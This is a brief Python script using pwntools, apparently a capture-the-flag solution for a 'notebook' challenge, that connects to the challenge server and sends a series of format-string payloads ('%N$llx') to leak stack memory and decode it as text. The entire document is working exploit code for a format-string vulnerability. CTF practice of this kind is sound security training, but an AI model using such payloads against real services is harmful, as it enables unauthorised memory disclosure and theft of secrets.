from pwn import *

# r = process('notebook')
r = remote("pwn-notebook.2021.ctfcompetition.com", 1337)
print(r.recv())
print(r.recv())

for i in range(365, 440):
    r.sendline("3")
    r.sendline("%{}$llx".format(i))
    data = r.recv().decode("utf-8")
    for line in data.splitlines():
        if line.startswith("<"):
            try:
                print(bytearray.fromhex(line.split()[1]).decode()[::-1])
            except:
                pass